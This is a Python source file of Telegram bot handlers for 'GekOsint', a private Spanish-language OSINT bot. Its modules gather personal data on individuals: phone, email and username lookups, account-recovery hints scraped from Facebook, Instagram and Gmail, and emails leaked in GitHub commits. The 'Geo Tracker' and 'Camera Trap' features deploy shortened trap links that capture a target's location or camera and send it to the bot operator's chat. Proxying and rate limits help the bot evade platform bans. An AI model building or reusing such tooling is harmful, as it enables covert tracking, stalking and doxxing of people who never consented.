# -*- coding: utf-8 -*-
from telegram import Update
from telegram.ext import ContextTypes
from ui.menus import main_menu, back_btn
from ui.templates import (
    format_ip_result, format_phone_result_with_ip, format_username_result,
    format_email_result, format_exif_result, format_whatsapp_result,
    format_people_result, format_dns_result,
    format_github_recon, format_ig_osint,
    format_gmail_osint, format_fb_osint,
    format_email_recon, format_tiktok_osint,
)
from modules.ip_lookup import get_ip_info
from modules.phone_lookup import analyze_phone
from modules.username_search import search_username
from modules.email_analysis import analyze_email
from modules.tracking import generate_tracking_page
from modules.exif_extract import get_exif, detect_face_heuristic
from modules.whatsapp_osint import analyze_whatsapp
from modules.people_search import search_people
from modules.dns_lookup import get_dns_info
from modules.github_recon import github_recon
from modules.ig_osint import ig_lookup, check_ig_rate_limit
from modules.gmail_osint import gmail_lookup, check_gmail_rate_limit
from modules.fb_osint import fb_lookup, check_fb_rate_limit
from modules.email_recon import email_recon, check_email_recon_rate_limit
from modules.tiktok_osint import tiktok_lookup, check_tiktok_rate_limit
from utils.apis import deploy_html, shorten_url, generate_text_report, upload_bytes
from utils.access import load_authorized_users, add_user, remove_user, get_all_users
from utils.rate_limit import check_rate_limit
from utils.parse import extract_phone_and_target
from utils.database import log_query, upsert_user, log_error, get_global_stats
from config import BOT_TOKEN, logger, ADMIN_ID, ADMIN_IDS
from datetime import datetime
import re
import asyncio

# ── Mensajes de acceso ────────────────────────────────────────────────────────
DENIED_MSG = (
    "🔒 <b>ACCESO DENEGADO</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "⛔ No tienes autorización para usar este bot.\n\n"
    "📋 <b>Tu información:</b>\n"
    "• ID: <code>{user_id}</code>\n"
    "• Nombre: {name}\n"
    "• Username: @{username}\n\n"
    "🛡️ <i>Bot privado — solo usuarios autorizados.</i>"
)

RATE_LIMIT_MSG = (
    "⏳ <b>Demasiadas consultas.</b>\n"
    "Espera <b>{seconds}s</b> antes de continuar."
)


# ── Control de acceso ─────────────────────────────────────────────────────────

def is_authorized(user_id: int) -> bool:
    return user_id in get_all_users()


async def check_access(update: Update, context: ContextTypes.DEFAULT_TYPE = None) -> bool:
    user = update.effective_user
    if not user:
        return False
    if is_authorized(user.id):
        return True

    logger.warning(f"🚫 Acceso denegado — {user.full_name} (@{user.username}) ID:{user.id}")
    msg = DENIED_MSG.format(
        user_id=user.id,
        name=user.full_name or "N/A",
        username=user.username or "sin_username",
    )
    if update.callback_query:
        await update.callback_query.answer("🔒 Acceso denegado", show_alert=True)
    elif update.message:
        await update.message.reply_text(msg, parse_mode="HTML")

    if context and ADMIN_ID:
        try:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            alert = (
                f"🚨 <b>INTENTO DE ACCESO</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Nombre:</b> {user.full_name}\n"
                f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
                f"📛 <b>Username:</b> @{user.username or 'N/A'}\n"
                f"🕐 <b>Hora:</b> {now}\n"
            )
            await context.bot.send_message(ADMIN_ID, alert, parse_mode="HTML")
        except Exception:
            pass
    return False


async def check_rate(update: Update, user_id: int) -> bool:
    allowed, wait = check_rate_limit(user_id)
    if not allowed:
        txt = RATE_LIMIT_MSG.format(seconds=wait)
        if update.callback_query:
            await update.callback_query.answer(f"⏳ Espera {wait}s", show_alert=True)
        elif update.message:
            await update.message.reply_text(txt, parse_mode="HTML")
    return allowed


# ── /admin ────────────────────────────────────────────────────────────────────

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        return

    args = context.args
    if not args:
        users = get_all_users()
        user_list = "\n".join(f"  <code>{u}</code>" for u in sorted(users))
        msg = (
            "🛡️ <b>Panel de Administración — GekOsint</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👥 <b>Usuarios autorizados:</b> {len(users)}\n"
            f"{user_list}\n\n"
            "📝 <b>Comandos:</b>\n"
            "• <code>/admin add ID</code>    — Añadir usuario\n"
            "• <code>/admin remove ID</code> — Eliminar usuario\n"
            "• <code>/admin stats</code>     — Ver estadísticas\n"
            "• <code>/admin proxy</code>     — Probar conectividad del PROXY_URL\n"
            "• <code>/admin fbdebug</code>   — Bajar HTMLs guardados del último FB lookup\n"
        )
        await update.message.reply_text(msg, parse_mode="HTML")
        return

    cmd = args[0].lower()
    if cmd == "add" and len(args) > 1:
        if not args[1].isdigit():
            await update.message.reply_text(
                f"❌ El ID debe ser numérico. Recibí: <code>{args[1]}</code>\n\n"
                f"Uso: <code>/admin add 123456789</code>",
                parse_mode="HTML",
            )
            return
        if add_user(args[1]):
            await update.message.reply_text(f"✅ Usuario <code>{args[1]}</code> añadido.", parse_mode="HTML")
        else:
            await update.message.reply_text("❌ Error al añadir usuario.")
    elif cmd == "remove" and len(args) > 1:
        if not args[1].isdigit():
            await update.message.reply_text(
                f"❌ El ID debe ser numérico. Recibí: <code>{args[1]}</code>",
                parse_mode="HTML",
            )
            return
        if remove_user(args[1]):
            await update.message.reply_text(f"✅ Usuario <code>{args[1]}</code> eliminado.", parse_mode="HTML")
        else:
            await update.message.reply_text("❌ No se pudo eliminar (puede ser usuario inicial o admin).")
    elif cmd == "stats":
        stats = get_global_stats()
        top_txt = ""
        for name, cnt in (stats.get("top_modules") or []):
            top_txt += f"   ▪️ {name}: <b>{cnt}</b>\n"
        await update.message.reply_text(
            f"📊 <b>Estadísticas GekOsint v6.1</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👥 <b>Usuarios autorizados:</b> {len(get_all_users())}\n"
            f"👤 <b>Usuarios en DB:</b>       {stats.get('total_users', 0)}\n"
            f"🟢 <b>Activos (24h):</b>        {stats.get('active_24h', 0)}\n\n"
            f"📋 <b>Consultas totales:</b>     {stats.get('total', 0)}\n"
            f"📅 <b>Últimas 24h:</b>           {stats.get('last_24h', 0)}\n"
            f"📆 <b>Última semana:</b>         {stats.get('last_7d', 0)}\n"
            f"✅ <b>Tasa de éxito (24h):</b>  {stats.get('success_rate', 100)}%\n"
            f"❌ <b>Errores (24h):</b>         {stats.get('errors_24h', 0)}\n\n"
            f"🏆 <b>Top módulos:</b>\n{top_txt}",
            parse_mode="HTML",
        )
    elif cmd == "fbdebug":
        # /admin fbdebug → manda los HTMLs de FB recovery guardados
        from io import BytesIO
        import os as _os
        from config import PAGES_DIR
        sent = 0
        for fname in ("fb_debug_paso1.html", "fb_debug_paso2.html",
                      "fb_debug_step3.html"):
            path = _os.path.join(PAGES_DIR, fname)
            if _os.path.isfile(path):
                try:
                    with open(path, "rb") as f:
                        bio = BytesIO(f.read())
                        bio.name = fname
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=bio,
                        caption=f"FB debug: {fname}",
                    )
                    sent += 1
                except Exception as e:
                    await update.message.reply_text(
                        f"❌ Error mandando {fname}: {e}"
                    )
        if sent == 0:
            await update.message.reply_text(
                "❌ No hay HTMLs de debug guardados. Hacé un FB OSINT primero."
            )
        else:
            await update.message.reply_text(f"✅ {sent} archivo(s) enviados.")
    elif cmd == "proxy":
        # /admin proxy → testea que el PROXY_URL funcione
        import httpx
        from config import PROXY_URL
        if not PROXY_URL:
            await update.message.reply_text(
                "❌ <b>PROXY_URL no configurado</b>\n\n"
                "Setealo en Koyeb env vars con formato:\n"
                "<code>http://user:pass@host:port</code>\n"
                "<code>socks5://user:pass@host:port</code>",
                parse_mode="HTML",
            )
            return
        try:
            from urllib.parse import urlparse
            pu = urlparse(PROXY_URL)
            display = f"{pu.scheme}://{pu.hostname}:{pu.port}"
        except Exception:
            display = "(no parseable)"
        await update.message.reply_text(
            f"🔍 <b>Probando proxy...</b>\n<code>{display}</code>",
            parse_mode="HTML",
        )
        try:
            async with httpx.AsyncClient(
                proxy=PROXY_URL, timeout=15.0,
            ) as client:
                # Test 1: ¿qué IP ven los servicios desde el proxy?
                r = await client.get("https://api.ipify.org?format=json")
                ip_via_proxy = r.json().get("ip", "?") if r.status_code == 200 else f"HTTP {r.status_code}"

                # Test 2: ¿FB nos responde 200 desde el proxy?
                fb_test = "?"
                try:
                    r2 = await client.get(
                        "https://m.facebook.com/login/identify/?ctx=recover",
                        headers={"User-Agent": "Mozilla/5.0 (iPhone) Safari/604.1"},
                        follow_redirects=True,
                    )
                    fb_test = f"HTTP {r2.status_code}"
                except Exception as e:
                    fb_test = f"❌ {type(e).__name__}: {str(e)[:60]}"

            await update.message.reply_text(
                f"✅ <b>Proxy funciona</b>\n\n"
                f"🌐 IP saliente: <code>{ip_via_proxy}</code>\n"
                f"📘 FB recovery responde: <code>{fb_test}</code>\n\n"
                f"<i>Si IP saliente es la del proxy y FB devuelve 200, "
                f"el módulo FB OSINT debería funcionar.</i>",
                parse_mode="HTML",
            )
        except Exception as e:
            await update.message.reply_text(
                f"❌ <b>Proxy NO funciona</b>\n\n"
                f"Error: <code>{type(e).__name__}: {str(e)[:200]}</code>\n\n"
                f"<i>Causas comunes:\n"
                f"• El host:port del proxy no es accesible desde Koyeb\n"
                f"• Si es tu PC: necesitás exponerla con ngrok/Cloudflare Tunnel\n"
                f"• Credenciales incorrectas\n"
                f"• Proxy SOCKS5 sin <code>httpx[socks]</code></i>",
                parse_mode="HTML",
            )


# ── /start y /help ────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return

    tg_user = update.effective_user
    upsert_user(tg_user.id, tg_user.username or "", tg_user.full_name or "")

    total = len(get_all_users())
    txt = (
        f"👋 <b>Bienvenido, {tg_user.first_name}</b>\n\n"
        f"🛡️ <b>GekOsint v6.1</b> — Sistema de Inteligencia OSINT\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔍 <b>IP Lookup</b>        — Geoloc, WHOIS, puertos, blacklist\n"
        f"📱 <b>Phone Intel</b>      — Caller ID, spam, operadora, región\n"
        f"👤 <b>Username Search</b>  — 50+ plataformas + Telegram\n"
        f"📧 <b>Email Analysis</b>   — Reputación, brechas, DNS\n"
        f"💚 <b>WhatsApp OSINT</b>   — Registro, spam, Business\n"
        f"🌍 <b>Geo Tracker</b>      — Enlace trampa de ubicación\n"
        f"📸 <b>Camera Trap</b>      — Captura de cámara remota\n"
        f"🖼️ <b>EXIF + Face Search</b> — Metadatos, GPS + búsqueda por rostro\n"
        f"🧑‍💼 <b>People Search</b>    — Nombre → redes, dorks, OSINT\n"
        f"🌐 <b>Domain/DNS</b>       — WHOIS, registros, seguridad\n"
        f"📷 <b>IG OSINT</b>         — Perfil, posts, recovery hints (email/phone)\n"
        f"💻 <b>GitHub Recon</b>     — Perfil, repos, emails leakeados en commits\n"
        f"📧 <b>Gmail OSINT</b>      — Existencia, recovery hints, People API, YouTube\n"
        f"📘 <b>FB OSINT</b>         — User ID, foto, recovery hints (email/phone)\n"
        f"📹 <b>TikTok OSINT</b>     — Perfil, stats, engagement, tier de influencer\n"
        f"📨 <b>Email Recon</b>      — Multi-plataforma: 12+ servicios en paralelo\n\n"
        f"<i>🔒 {total} usuario(s) autorizado(s) · 16 módulos activos</i>"
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(txt, reply_markup=main_menu(), parse_mode="HTML")
    else:
        await update.message.reply_text(txt, reply_markup=main_menu(), parse_mode="HTML")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)


# ── Callback handler ──────────────────────────────────────────────────────────

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    if not await check_access(update, context):
        return

    await query.answer()
    data = query.data

    if data == "start":
        await start(update, context)
        return

    # Exportar reporte
    if data == "export_txt":
        last = context.user_data.get("last_result")
        if not last:
            await query.answer("No hay datos para exportar.", show_alert=True)
            return
        await query.answer("Generando reporte…")
        report = generate_text_report("OSINT Analysis", last)
        from io import BytesIO
        bio = BytesIO(report.encode())
        bio.name = f"GekOsint_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        await context.bot.send_document(
            query.message.chat_id, bio,
            caption="🛡️ Reporte GekOsint v6.0"
        )
        return

    # Acerca de
    if data == "menu_about":
        context.user_data.pop("mode", None)
        await query.edit_message_text(
            "ℹ️ <b>GekOsint v6.0</b>\n\n"
            "🛡️ Sistema de Inteligencia OSINT\n"
            "📋 12 módulos activos\n"
            "🔒 Acceso restringido con rate limiting\n"
            "☁️ Cloud-Ready (Railway, Render, Koyeb, Fly.io)\n\n"
            "<i>Desarrollado para investigación ética y legal.</i>",
            reply_markup=back_btn(), parse_mode="HTML"
        )
        return

    # Trackers (acción inmediata)
    if data in ("menu_geo", "menu_cam"):
        if not await check_rate(update, query.from_user.id):
            return
        await query.edit_message_text(
            "⚙️ <b>Generando enlace trampa…</b>\n<i>(Puede tardar unos segundos)</i>",
            parse_mode="HTML"
        )
        type_ = "geo" if data == "menu_geo" else "cam"
        fname, html = generate_tracking_page(BOT_TOKEN, query.message.chat_id, type_)
        url = await deploy_html(html, fname)
        if url:
            short = await shorten_url(url)
            icon  = "🌍" if type_ == "geo" else "📸"
            msg   = (
                f"{icon} <b>Enlace {type_.upper()} generado</b>\n\n"
                f"🔗 <code>{short}</code>\n\n"
                f"⚠️ <i>La información capturada llegará a este chat.</i>\n"
                f"📌 El usuario debe aceptar permisos de {'ubicación' if type_ == 'geo' else 'cámara'}."
            )
            await context.bot.send_message(
                query.message.chat_id, msg, parse_mode="HTML", reply_markup=back_btn()
            )
        else:
            await context.bot.send_message(
                query.message.chat_id, "❌ Error al subir el archivo. Intenta de nuevo.",
                reply_markup=back_btn()
            )
        return

    # Módulos que esperan input del usuario
    _prompts = {
        "menu_ip":     "📡 <b>IP Lookup</b>\n\nEnvía la dirección IP a investigar:",
        "menu_phone":  (
            "📱 <b>Phone Intel</b>\n\n"
            "Envía el número con código de país:\n"
            "<code>+52 55 1234 5678</code>\n\n"
            "<i>Opcional: añade una IP o dominio para análisis combinado:\n"
            "+52... | 8.8.8.8\n"
            "+52... | example.com</i>"
        ),
        "menu_user":   "👤 <b>Username Search</b>\n\nEnvía el username a rastrear:",
        "menu_email":  "📧 <b>Email Analysis</b>\n\nEnvía el correo electrónico:",
        "menu_exif":   "🖼️ <b>EXIF Data</b>\n\nEnvía la imagen como <b>DOCUMENTO</b> (sin compresión).\n<i>No la envíes como foto normal o los metadatos se perderán.</i>",
        "menu_wa":     "💚 <b>WhatsApp OSINT</b>\n\nEnvía el número con código de país (ej: <code>+52 55 1234 5678</code>):",
        "menu_dns":    "🌐 <b>Domain/DNS</b>\n\nEnvía el dominio a investigar (ej: <code>google.com</code>):",
        "menu_people": (
            "🧑‍💼 <b>People Search</b>\n\n"
            "Envía el nombre completo a investigar:\n\n"
            "<i>Ej: Juan García\n"
            "Ej: María López Torres</i>\n\n"
            "🔍 Busca perfiles en 20+ redes, genera dorks OSINT."
        ),
        "menu_geoloc": (
            "🛰️ <b>Geo Localización</b>\n\n"
            "Envía una de estas opciones:\n\n"
            "1️⃣ <b>IP</b> → geolocalización\n"
            "2️⃣ <b>Coordenadas</b> → <code>19.4326, -99.1332</code>\n"
            "3️⃣ <b>URL de Google Maps</b> → extracción de coords"
        ),
        "menu_github": (
            "💻 <b>GitHub Recon</b>\n\n"
            "Envía un <b>username</b> de GitHub o un <b>email</b>:\n\n"
            "<code>octocat</code>\n"
            "<code>@octocat</code>\n"
            "<code>user@example.com</code>\n\n"
            "🔍 Devuelve: perfil, repos top, orgs, gists, llaves SSH/GPG y "
            "<b>emails leakeados en commits públicos</b>."
        ),
        "menu_ig": (
            "📷 <b>IG OSINT</b>\n\n"
            "Envía el <b>username</b> de Instagram (sin @):\n\n"
            "<code>cristiano</code>\n"
            "<code>nasa</code>\n\n"
            "🔍 Devuelve: perfil, posts recientes con geotags, y "
            "<b>email/teléfono parcialmente ofuscados</b> (técnica Toutatis).\n\n"
            "⏳ <i>Rate limit anti-ban: 1 consulta cada 60s, 20/hora por usuario. "
            "Es para que IG no bloquee la cuenta de sesión.</i>"
        ),
        "menu_gmail": (
            "📧 <b>Gmail / Google OSINT</b>\n\n"
            "Envía un email Gmail o de Google Workspace:\n\n"
            "<code>usuario@gmail.com</code>\n"
            "<code>contacto@miempresa.com</code>\n\n"
            "🔍 Devuelve: existencia, <b>recovery hints</b> (phone/email parcial), "
            "Gravatar, posibles canales YouTube y, si hay cookies, perfil completo "
            "vía People API (gaia ID, nombres, foto HD).\n\n"
            "⏳ <i>Rate limit anti-ban: 1/60s, 20/hora.</i>"
        ),
        "menu_fb": (
            "📘 <b>Facebook OSINT</b>\n\n"
            "Envía username, email, teléfono o user ID de FB:\n\n"
            "<code>zuck</code>\n"
            "<code>algun.usuario</code>\n"
            "<code>4</code> (user ID numérico)\n\n"
            "🔍 Devuelve: <b>recovery hints</b> (email/phone parcial), "
            "user ID numérico, foto de perfil HD, link al perfil.\n\n"
            "⏳ <i>FB es estricto — rate limit: 1/90s, 15/hora. "
            "Si nos rate-limitea, pausa global de 45 min.</i>"
        ),
        "menu_emailrecon": (
            "📨 <b>Email Multi-Platform Recon</b>\n\n"
            "Envía cualquier email:\n\n"
            "<code>persona@gmail.com</code>\n"
            "<code>contacto@empresa.com</code>\n\n"
            "🔍 Chequea contra <b>~12 servicios</b> en paralelo "
            "(X/Twitter, Microsoft, Apple, Spotify, Adobe, Pinterest, "
            "GitHub, Duolingo, Imgur, Strava, LastPass, Proton).\n\n"
            "Reporta dónde está registrado el email y, en algunos servicios, "
            "extrae <b>hints adicionales</b> como username público asociado.\n\n"
            "⏳ <i>Rate limit suave: 1/30s, 30/hora.</i>"
        ),
        "menu_tiktok": (
            "📹 <b>TikTok OSINT</b>\n\n"
            "Envía un <b>username</b>, @username o URL de TikTok:\n\n"
            "<code>cristiano</code>\n"
            "<code>@cristiano</code>\n"
            "<code>https://www.tiktok.com/@cristiano</code>\n\n"
            "🔍 Devuelve: perfil completo, seguidores, likes totales, "
            "cantidad de videos, <b>engagement estimado</b>, tier de influencer "
            "(nano/micro/macro/mega), cuenta comercial, región y fecha de creación.\n\n"
            "⏳ <i>Rate limit: 1/45s, 20/hora por usuario.</i>"
        ),
    }

    if data in _prompts:
        context.user_data["mode"] = data
        await query.edit_message_text(_prompts[data], reply_markup=back_btn(), parse_mode="HTML")


# ── Message handler ───────────────────────────────────────────────────────────

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    if not await check_rate(update, update.effective_user.id):
        return

    mode = context.user_data.get("mode")
    text = update.message.text

    if not mode:
        return  # Mensaje sin contexto activo

    msg = await update.message.reply_text("⏳ <b>Procesando…</b>", parse_mode="HTML")

    try:
        response = None

        if mode == "menu_ip":
            data = await asyncio.to_thread(get_ip_info, text.strip())
            response = format_ip_result(data)

        elif mode == "menu_phone":
            phone_token, target_token = extract_phone_and_target(text)
            data = await asyncio.to_thread(analyze_phone, phone_token)
            if target_token and "error" not in data:
                data["ip_intel_target"] = target_token
                data["ip_intel"] = await asyncio.to_thread(get_ip_info, target_token)
            response = format_phone_result_with_ip(data)

        elif mode == "menu_user":
            found, telegram_data = await asyncio.to_thread(search_username, text.strip())
            response = format_username_result(text.strip(), found, telegram_data)

        elif mode == "menu_email":
            data = await asyncio.to_thread(analyze_email, text.strip())
            response = format_email_result(data)

        elif mode == "menu_wa":
            data = await asyncio.to_thread(analyze_whatsapp, text.strip())
            response = format_whatsapp_result(data)

        elif mode == "menu_dns":
            data = await asyncio.to_thread(get_dns_info, text.strip())
            response = format_dns_result(data)

        elif mode == "menu_people":
            data = await asyncio.to_thread(search_people, text.strip())
            response = format_people_result(data)

        elif mode == "menu_github":
            # github_recon es async nativo (httpx) → await directo, sin to_thread
            data = await github_recon(text.strip())
            response = format_github_recon(data)

        elif mode == "menu_ig":
            # Rate limiter dedicado a IG (separado del global del bot)
            allowed, reason = check_ig_rate_limit(update.effective_user.id)
            if not allowed:
                response = (
                    f"⏳ <b>IG OSINT — rate limit</b>\n\n"
                    f"{reason}\n\n"
                    f"<i>Esto protege la cuenta de sesión de bloqueos por IG.</i>"
                )
            else:
                data = await ig_lookup(text.strip())
                response = format_ig_osint(data)

        elif mode == "menu_gmail":
            allowed, reason = check_gmail_rate_limit(update.effective_user.id)
            if not allowed:
                response = (
                    f"⏳ <b>Gmail OSINT — rate limit</b>\n\n"
                    f"{reason}\n\n"
                    f"<i>Anti-ban contra Google.</i>"
                )
            else:
                data = await gmail_lookup(text.strip())
                response = format_gmail_osint(data)

        elif mode == "menu_fb":
            allowed, reason = check_fb_rate_limit(update.effective_user.id)
            if not allowed:
                response = (
                    f"⏳ <b>FB OSINT — rate limit</b>\n\n"
                    f"{reason}\n\n"
                    f"<i>Meta es muy agresivo — esto evita que la cuenta de "
                    f"sesión se bloquee.</i>"
                )
            else:
                data = await fb_lookup(text.strip())
                response = format_fb_osint(data)

        elif mode == "menu_emailrecon":
            allowed, reason = check_email_recon_rate_limit(update.effective_user.id)
            if not allowed:
                response = f"⏳ <b>Email Recon — rate limit</b>\n\n{reason}"
            else:
                data = await email_recon(text.strip())
                response = format_email_recon(data)

        elif mode == "menu_tiktok":
            allowed, reason = check_tiktok_rate_limit(update.effective_user.id)
            if not allowed:
                response = (
                    f"⏳ <b>TikTok OSINT — rate limit</b>\n\n"
                    f"{reason}\n\n"
                    f"<i>Rate limit para no sobrecargar la IP del servidor.</i>"
                )
            else:
                data = await tiktok_lookup(text.strip())
                response = format_tiktok_osint(data)

        elif mode == "menu_exif":
            # El usuario mandó texto en vez de imagen
            await msg.edit_text(
                "🖼️ <b>EXIF + Face Search</b>\n\n"
                "Envía la imagen como <b>DOCUMENTO</b> (sin compresión).\n"
                "<i>No la envíes como foto normal o Telegram la comprimirá y "
                "perderás los metadatos EXIF.</i>",
                parse_mode="HTML", reply_markup=back_btn()
            )
            return

        if response is None:
            await msg.delete()
            return

        # Logging a DB
        try:
            log_query(update.effective_user.id, mode, text.strip()[:100], success=True)
        except Exception:
            pass

        context.user_data["last_result"] = response
        context.user_data.pop("mode", None)
        await msg.edit_text(
            response, parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=back_btn(show_export=True)
        )

    except Exception as e:
        logger.error(f"[handler] Error en mode={mode}: {e}", exc_info=True)
        try:
            log_error(mode, str(e))
        except Exception:
            pass
        await msg.edit_text(f"❌ Error inesperado: <code>{e}</code>", parse_mode="HTML", reply_markup=back_btn())


# ── Document/Photo handler (EXIF) ─────────────────────────────────────────────

async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    if context.user_data.get("mode") != "menu_exif":
        return
    if not await check_rate(update, update.effective_user.id):
        return

    msg = await update.message.reply_text(
        "⏳ <b>Descargando y analizando imagen…</b>\n"
        "<i>Extrayendo EXIF + detectando rostro…</i>",
        parse_mode="HTML"
    )

    try:
        from io import BytesIO
        if update.message.document:
            file_obj = await update.message.document.get_file()
        elif update.message.photo:
            file_obj = await update.message.photo[-1].get_file()
        else:
            await msg.edit_text("❌ Por favor envía una imagen.", reply_markup=back_btn())
            return

        # ── Descarga ──────────────────────────────────────────────────────
        buf = BytesIO()
        await file_obj.download_to_memory(buf)
        img_bytes = buf.getvalue()          # ← BUG FIX: antes era img_bytes (undefined)

        if not img_bytes:
            await msg.edit_text("❌ No se pudo descargar la imagen.", reply_markup=back_btn())
            return

        # ── EXIF ──────────────────────────────────────────────────────────
        data = await asyncio.to_thread(get_exif, img_bytes)

        # ── Detección de rostro (heurística skin-tone Kovac) ──────────────
        has_face = await asyncio.to_thread(detect_face_heuristic, img_bytes)
        data["has_face"] = has_face

        # ── Subir imagen para búsqueda inversa ────────────────────────────
        await msg.edit_text(
            "⏳ <b>Subiendo imagen para búsqueda inversa…</b>",
            parse_mode="HTML"
        )
        # Determinar extensión
        fmt = (data.get("basic") or {}).get("Format", "JPEG").upper()
        ext_map = {"JPEG": "jpg", "PNG": "png", "WEBP": "webp",
                   "GIF": "gif", "BMP": "bmp", "TIFF": "tiff"}
        ext      = ext_map.get(fmt, "jpg")
        ct_map   = {"jpg": "image/jpeg", "png": "image/png",
                    "webp": "image/webp", "gif": "image/gif"}
        ct       = ct_map.get(ext, "image/jpeg")
        fname    = f"gekosint_exif_{update.effective_user.id}.{ext}"

        try:
            image_url = await upload_bytes(img_bytes, fname, ct)
            if image_url:
                data["image_url"] = image_url
        except Exception as _ue:
            logger.debug(f"[exif] upload fallido: {_ue}")

        # ── Formatear resultado ───────────────────────────────────────────
        response = format_exif_result(data)

        # Logging DB
        try:
            log_query(update.effective_user.id, "menu_exif", fname[:100], success=True)
        except Exception:
            pass

        context.user_data["last_result"] = response
        context.user_data.pop("mode", None)
        await msg.edit_text(
            response, parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=back_btn(show_export=True)
        )

    except Exception as e:
        logger.error(f"[document_handler] {e}", exc_info=True)
        try:
            log_error("menu_exif", str(e))
        except Exception:
            pass
        await msg.edit_text(
            f"❌ Error procesando imagen: <code>{e}</code>",
            parse_mode="HTML", reply_markup=back_btn()
        )


# ---- cancel_command --------------------------------------------------

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancela el modo activo y vuelve al menu principal."""
    if not await check_access(update, context):
        return
    mode = context.user_data.pop("mode", None)
    if mode:
        await update.message.reply_text(
            "❌ <b>Operacion cancelada.</b>\n\nUsa el menu para empezar de nuevo.",
            parse_mode="HTML",
            reply_markup=main_menu()
        )
    else:
        await update.message.reply_text(
            "ℹ️ No hay ninguna operacion activa.",
            reply_markup=main_menu()
        )
